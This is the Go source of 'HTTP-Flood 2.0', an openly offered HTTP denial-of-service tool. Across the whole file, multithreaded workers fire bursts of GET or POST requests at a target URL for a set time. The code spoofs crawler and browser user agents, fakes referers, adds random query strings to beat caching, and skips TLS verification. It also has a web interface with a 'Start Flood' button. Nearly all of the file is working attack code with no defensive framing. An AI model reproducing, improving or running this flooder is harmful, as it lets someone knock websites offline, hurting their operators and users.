/*
Coded by LeeOn123
Please fking code ur script by ur self, kid.

I changed the random integers range to the max of int32.
Now 386 systems should work well.

Looks like most people want to hit the url but not the host/ip.
As a result, here you are.
*/
package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"html/template"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	host      = ""
	port      = "80"
	page      = ""
	mode      = ""
	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
	start     = make(chan bool)
	acceptall = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}
	key     string
	choice  = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64"}
	choice5 = []string{"chrome", "spider", "ie"}
	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
	spider  = []string{
		"AdsBot-Google ( http://www.google.com/adsbot.html)",
		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
		"Googlebot-Image/1.0",
		"Googlebot-News",
		"Googlebot-Video/1.0",
	}
	referers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
	}
	pageTemplate = template.Must(template.New("page").Parse(pageHTML))
)

const pageHTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>httpflood</title>
  <style>
    :root { color-scheme: dark; --bg:#010503; --panel:#06110a; --line:#1b6131; --text:#8eff9a; --muted:#53bb68; --accent:#0ea12c; --danger:#b14a4a; }
    * { box-sizing: border-box; }
    body { margin:0; min-height:100vh; background:radial-gradient(900px 500px at 50% -20%, rgba(58,255,101,.08), transparent 60%), #000; color:var(--text); font-family:Consolas, "Courier New", monospace; padding:12px; }
    body::before { content:""; position:fixed; inset:0; pointer-events:none; background:repeating-linear-gradient(to bottom, rgba(255,255,255,.035) 0 1px, transparent 2px 4px); opacity:.22; }
    .wrap { position:relative; max-width:980px; margin:0 auto; display:grid; gap:12px; }
    .card { background:rgba(2,10,5,.94); border:1px solid var(--line); border-radius:4px; padding:14px; box-shadow:0 0 22px rgba(28,255,73,.1); overflow:auto; }
    h1, h2 { margin:0 0 10px; letter-spacing:0; text-transform:uppercase; text-shadow:0 0 8px rgba(142,255,154,.36); }
    h1 { font-size:1.28rem; }
    h2 { color:var(--muted); font-size:.98rem; }
    p { margin:0; color:var(--muted); }
    form { display:grid; gap:12px; }
    .grid { display:grid; gap:10px; grid-template-columns:repeat(2,minmax(0,1fr)); }
    label { display:grid; gap:6px; color:var(--muted); font-size:.86rem; }
    input, select, textarea { width:100%; border:1px solid var(--line); border-radius:2px; background:#020b04; color:var(--text); padding:9px; font:inherit; }
    input:focus, select:focus, textarea:focus { outline:0; border-color:#b8ff9a; box-shadow:0 0 0 3px rgba(110,255,130,.16); }
    textarea { min-height:110px; resize:vertical; }
    button { border:0; border-radius:2px; background:var(--accent); color:#041307; padding:10px 14px; font:inherit; font-weight:700; text-transform:uppercase; cursor:pointer; }
    .message { border:1px solid var(--line); background:#021007; padding:10px; white-space:pre-wrap; overflow-wrap:anywhere; }
    .message.error { border-color:var(--danger); color:#ff9b9b; }
    .logs { min-height:340px; font-size:.86rem; line-height:1.45; }
    @media (max-width:720px) { .grid { grid-template-columns:1fr; } body { padding:8px; } .card { padding:10px; } .logs { min-height:240px; } }
  </style>
</head>
<body>
  <main class="wrap">
    <section class="card">
      <h1>httpflood</h1>
      <p>terminal web ui / legacy config only</p>
    </section>
    <section class="card">
      <h2>Start</h2>
      {{if .Error}}<div class="message error">{{.Error}}</div>{{end}}
      {{if .Result}}<div class="message">{{.Result}}</div>{{end}}
      <form method="post">
        <div class="grid">
          <label>Target URL
            <input name="url" type="text" value="{{.URL}}" placeholder="http://127.0.0.1:8080/" required>
          </label>
          <label>Threads
            <input name="threads" type="number" min="1" value="{{if eq .Threads 0}}20{{else}}{{.Threads}}{{end}}" required>
          </label>
          <label>Requests per connection
            <input name="requests_per_conn" type="number" min="1" value="{{if eq .RequestsPerConn 0}}100{{else}}{{.RequestsPerConn}}{{end}}" required>
          </label>
          <label>Method
            <select name="method">
              <option value="get" {{if eq .Method "get"}}selected{{end}}>GET</option>
              <option value="post" {{if eq .Method "post"}}selected{{end}}>POST</option>
            </select>
          </label>
          <label>Duration seconds
            <input name="seconds" type="number" min="1" value="{{if eq .Seconds 0}}10{{else}}{{.Seconds}}{{end}}" required>
          </label>
          <label>Header preset
            <select name="header_preset">
              <option value="default" {{if eq .HeaderPreset "default"}}selected{{end}}>Default legacy</option>
              <option value="chrome_basic" {{if eq .HeaderPreset "chrome_basic"}}selected{{end}}>Chrome basic</option>
              <option value="custom" {{if eq .HeaderPreset "custom"}}selected{{end}}>Custom</option>
            </select>
          </label>
        </div>
        <label>Custom Header Text (leave empty for nil)
          <textarea name="headers" placeholder="User-Agent: Example&#10;Accept: text/html">{{.HeaderText}}</textarea>
        </label>
        <button type="submit">Start Flood</button>
      </form>
    </section>
    <section class="card">
      <h2>Layer Logs</h2>
      <textarea class="logs" readonly>{{.Logs}}</textarea>
    </section>
  </main>
</body>
</html>`

type pageData struct {
	Error           string
	Result          string
	URL             string
	Threads         int
	RequestsPerConn int
	Method          string
	Seconds         int
	HeaderPreset    string
	HeaderText      string
	Logs            string
}

type logBuffer struct {
	mu      sync.Mutex
	lines   []string
	console bool
}

func (l *logBuffer) Append(layer string, format string, args ...interface{}) {
	msg := fmt.Sprintf("[%s] %s", layer, fmt.Sprintf(format, args...))
	l.mu.Lock()
	defer l.mu.Unlock()
	l.lines = append(l.lines, msg)
	if l.console {
		fmt.Println(msg)
	}
}

func (l *logBuffer) String() string {
	l.mu.Lock()
	defer l.mu.Unlock()
	return strings.Join(l.lines, "\n")
}

func init() {
	rand.Seed(time.Now().UnixNano()) //fixed seed problem
}
func getuseragent() string {

	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2)-1)]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3)-1)]
	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4)-1)]
	}
	browser := choice5[rand.Intn(len(choice5)-1)]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(1)
		var token string
		if option == 1 {
			token = choice6[rand.Intn(len(choice6)-1)] + "; "
		} else {
			token = ""
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

func contain(char string, x string) int { //simple compare
	times := 0
	ans := 0
	for i := 0; i < len(char); i++ {
		if char[times] == x[0] {
			ans = 1
		}
		times++
	}
	return ans
}

func flood() {
	addr := host + ":" + port
	header := ""
	if mode == "get" {
		header += " HTTP/1.1\r\nHost: "
		header += addr + "\r\n"
		if os.Args[5] == "nil" {
			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
			header += "User-Agent: " + getuseragent() + "\r\n"
			header += acceptall[rand.Intn(len(acceptall))]
			header += referers[rand.Intn(len(referers))] + "\r\n"
		} else {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s\n", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()
		}
	} else if mode == "post" {
		data := ""
		if os.Args[5] != "nil" {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s\n", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()

		} else {
			data = "f"
		}
		header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
		header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
	}
	var s net.Conn
	var err error
	<-start //received signal
	for {
		if port == "443" {
			cfg := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         host, //simple fix
			}
			s, err = tls.Dial("tcp", addr, cfg)
		} else {
			s, err = net.Dial("tcp", addr)
		}
		if err != nil {
			fmt.Println("Connection Down!!!") //When showing this message, it means ur ip got blocked or the target server down.
		} else {
			for i := 0; i < 100; i++ {
				request := ""
				if os.Args[3] == "get" {
					request += "GET " + page + key
					request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
				}
				request += header + "\r\n"
				s.Write([]byte(request))
			}
			s.Close()
		}
		//fmt.Println("Threads@", threads, " Hitting Target -->", url)// For those who like share to skid.
	}
}

func readHeaderFile(path string) (string, error) {
	if path == "nil" {
		return "", nil
	}
	fi, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer fi.Close()
	br := bufio.NewReader(fi)
	var b strings.Builder
	for {
		a, _, c := br.ReadLine()
		if c == io.EOF {
			break
		}
		b.WriteString(string(a))
		b.WriteString("\r\n")
	}
	return b.String(), nil
}

func chromeBasicHeader() string {
	return "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\r\n" +
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n" +
		"Accept-Language: en-US,en;q=0.9\r\n" +
		"Accept-Encoding: gzip, deflate, br\r\n" +
		"Sec-Fetch-Site: none\r\n" +
		"Sec-Fetch-Mode: navigate\r\n" +
		"Sec-Fetch-Dest: document\r\n"
}

func normalizeHeaderPreset(preset, headerFile string) string {
	if preset == "custom" && headerFile != "nil" {
		return "custom"
	}
	if preset == "chrome_basic" {
		return "chrome_basic"
	}
	return "default"
}

func buildRequestHeader(runMode, runHost, runPort, runPage, headerFile, headerPreset string) (string, error) {
	addr := runHost + ":" + runPort
	headerPreset = normalizeHeaderPreset(headerPreset, headerFile)
	header := ""
	if runMode == "get" {
		header += " HTTP/1.1\r\nHost: " + addr + "\r\n"
		if headerPreset == "chrome_basic" {
			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
			header += chromeBasicHeader()
			header += referers[rand.Intn(len(referers))] + "\r\n"
			return header, nil
		}
		if headerPreset == "default" {
			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
			header += "User-Agent: " + getuseragent() + "\r\n"
			header += acceptall[rand.Intn(len(acceptall))]
			header += referers[rand.Intn(len(referers))] + "\r\n"
			return header, nil
		}
		custom, err := readHeaderFile(headerFile)
		if err != nil {
			return "", err
		}
		header += custom
		return header, nil
	}

	data := "f"
	if headerPreset == "custom" {
		data = ""
		custom, err := readHeaderFile(headerFile)
		if err != nil {
			return "", err
		}
		header += custom
	}
	header += "POST " + runPage + " HTTP/1.1\r\nHost: " + addr + "\r\n"
	if headerPreset == "chrome_basic" {
		header += chromeBasicHeader()
	}
	header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
	if headerPreset != "chrome_basic" {
		header += "Accept-Encoding: gzip, deflate\r\n"
	}
	header += "\n" + data + "\r\n"
	return header, nil
}

func parseTarget(target string, logger *logBuffer) (string, string, string, string, error) {
	logger.Append("parse target", "input=%s", target)
	u, err := url.Parse(target)
	if err != nil {
		return "", "", "", "", fmt.Errorf("please input a correct url: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return "", "", "", "", fmt.Errorf("wrong scheme: only http or https")
	}
	tmp := strings.Split(u.Host, ":")
	runHost := tmp[0]
	runPort := u.Port()
	if u.Scheme == "https" {
		runPort = "443"
	}
	if runPort == "" {
		runPort = "80"
	}
	runPage := u.Path
	runKey := "?"
	if contain(runPage, "?") != 0 {
		runKey = "&"
	}
	logger.Append("parse target", "host=%s port=%s page=%s key=%s", runHost, runPort, runPage, runKey)
	return runHost, runPort, runPage, runKey, nil
}

func floodWorker(threadID int, runHost, runPort, runPage, runMode, runKey, headerFile, headerPreset string, requestsPerConn int, ready chan<- int, starter <-chan bool, done <-chan struct{}, logger *logBuffer) {
	addr := runHost + ":" + runPort
	headerPreset = normalizeHeaderPreset(headerPreset, headerFile)
	logger.Append("build header", "thread=%d mode=%s header=%s preset=%s", threadID, runMode, headerFile, headerPreset)
	header, err := buildRequestHeader(runMode, runHost, runPort, runPage, headerFile, headerPreset)
	if err != nil {
		logger.Append("build header", "thread=%d error=%v", threadID, err)
		ready <- threadID
		return
	}
	ready <- threadID
	<-starter
	logger.Append("thread ready", "thread=%d started", threadID)
	for {
		select {
		case <-done:
			logger.Append("stop", "thread=%d stopped", threadID)
			return
		default:
		}

		var s net.Conn
		if runPort == "443" {
			cfg := &tls.Config{InsecureSkipVerify: true, ServerName: runHost}
			s, err = tls.Dial("tcp", addr, cfg)
		} else {
			s, err = net.Dial("tcp", addr)
		}
		if err != nil {
			logger.Append("connection", "thread=%d down: %v", threadID, err)
			continue
		}
		logger.Append("connection", "thread=%d connected=%s requests_per_conn=%d", threadID, addr, requestsPerConn)
		written := 0
		for i := 0; i < requestsPerConn; i++ {
			select {
			case <-done:
				s.Close()
				logger.Append("stop", "thread=%d stopped during write", threadID)
				return
			default:
			}
			request := ""
			if runMode == "get" {
				request += "GET " + runPage + runKey
				request += strconv.Itoa(rand.Intn(2147483647)) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
			}
			request += header + "\r\n"
			if _, err := s.Write([]byte(request)); err != nil {
				logger.Append("write request", "thread=%d request=%d error=%v", threadID, i+1, err)
				break
			}
			if i == 0 {
				logger.Append("write request", "thread=%d first request written", threadID)
			}
			written++
		}
		logger.Append("write request", "thread=%d connection batch written=%d", threadID, written)
		s.Close()
	}
}

func runFlood(target string, threads int, requestsPerConn int, runMode string, seconds int, headerFile, headerPreset string, waitForEnter bool, logger *logBuffer) error {
	if runMode != "get" && runMode != "post" {
		return fmt.Errorf("wrong mode, only can use get or post")
	}
	if threads <= 0 {
		return fmt.Errorf("threads should be positive")
	}
	if seconds <= 0 {
		return fmt.Errorf("limit should be positive")
	}
	if requestsPerConn <= 0 {
		return fmt.Errorf("requests per connection should be positive")
	}
	runHost, runPort, runPage, runKey, err := parseTarget(target, logger)
	if err != nil {
		return err
	}

	headerPreset = normalizeHeaderPreset(headerPreset, headerFile)
	logger.Append("prepare threads", "threads=%d requests_per_conn=%d seconds=%d preset=%s", threads, requestsPerConn, seconds, headerPreset)
	starter := make(chan bool)
	done := make(chan struct{})
	ready := make(chan int, threads)
	for i := 0; i < threads; i++ {
		time.Sleep(time.Microsecond * 100)
		go floodWorker(i+1, runHost, runPort, runPage, runMode, runKey, headerFile, headerPreset, requestsPerConn, ready, starter, done, logger)
	}
	for i := 0; i < threads; i++ {
		threadID := <-ready
		logger.Append("thread ready", "thread=%d ready", threadID)
		if logger.console {
			fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
			os.Stdout.Sync()
		}
	}
	if waitForEnter {
		input := bufio.NewReader(os.Stdin)
		fmt.Printf("\nPlease [Enter] for continue")
		if _, err := input.ReadString('\n'); err != nil {
			return err
		}
	}
	logger.Append("start", "flood will end in %d seconds", seconds)
	close(starter)
	time.Sleep(time.Duration(seconds) * time.Second)
	close(done)
	logger.Append("stop", "flood completed")
	return nil
}

func startWebServer() {
	http.HandleFunc("/", handleIndex)
	fmt.Println("Starting httpflood UI on http://0.0.0.0:8080/")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		fmt.Println("Failed to start UI:", err)
	}
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	data := pageData{Method: "get", HeaderPreset: "default"}
	if r.Method == http.MethodPost {
		if err := r.ParseForm(); err != nil {
			data.Error = err.Error()
			renderPage(w, data)
			return
		}
		data.URL = r.FormValue("url")
		data.Method = r.FormValue("method")
		data.Threads, _ = strconv.Atoi(r.FormValue("threads"))
		data.RequestsPerConn, _ = strconv.Atoi(r.FormValue("requests_per_conn"))
		if data.RequestsPerConn == 0 {
			data.RequestsPerConn = 100
		}
		data.Seconds, _ = strconv.Atoi(r.FormValue("seconds"))
		data.HeaderPreset = r.FormValue("header_preset")
		data.HeaderText = r.FormValue("headers")

		headerFile := "nil"
		if strings.TrimSpace(data.HeaderText) != "" {
			tmpName := filepath.Join(os.TempDir(), fmt.Sprintf("httpflood-header-%d.txt", time.Now().UnixNano()))
			if err := os.WriteFile(tmpName, []byte(data.HeaderText), 0o600); err != nil {
				data.Error = fmt.Sprintf("unable to save headers: %v", err)
				renderPage(w, data)
				return
			}
			defer os.Remove(tmpName)
			headerFile = tmpName
		}
		data.HeaderPreset = normalizeHeaderPreset(data.HeaderPreset, headerFile)

		logger := &logBuffer{}
		if err := runFlood(data.URL, data.Threads, data.RequestsPerConn, data.Method, data.Seconds, headerFile, data.HeaderPreset, false, logger); err != nil {
			data.Error = err.Error()
		} else {
			data.Result = "completed"
		}
		data.Logs = logger.String()
	}
	renderPage(w, data)
}

func renderPage(w http.ResponseWriter, data pageData) {
	if err := pageTemplate.Execute(w, data); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
	}
}

func main() {
	fmt.Println("\r\n'||  ||`   ||      ||                '||''''| '||`                   ||` ")
	fmt.Println(" ||  ||    ||      ||                 ||  .    ||                    ||  ")
	fmt.Println(" ||''||  ''||''  ''||''  '||''|, ---  ||''|    ||  .|''|, .|''|, .|''||  ")
	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
	fmt.Println("                          ||                                             ")
	fmt.Println("                         .||                     Golang version 2.0      ")
	fmt.Println("                                                        C0d3d By L330n123")
	fmt.Println("==========================================================================")
	if len(os.Args) > 1 && os.Args[1] == "serve" {
		startWebServer()
		return
	}
	if len(os.Args) != 6 {
		fmt.Println("Post Mode will use header.txt as data")
		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil>")
		os.Exit(1)
	}
	if os.Args[3] != "get" && os.Args[3] != "post" {
		println("Wrong mode, Only can use \"get\" or \"post\"")
		return
	}
	threads, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Threads should be a integer")
		return
	}
	limit, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("limit should be a integer")
		return
	}
	logger := &logBuffer{console: true}
	cliPreset := "default"
	if os.Args[5] != "nil" {
		cliPreset = "custom"
	}
	if err := runFlood(os.Args[1], threads, 100, os.Args[3], limit, os.Args[5], cliPreset, true, logger); err != nil {
		fmt.Println("Error:", err)
		os.Exit(1)
	}
}
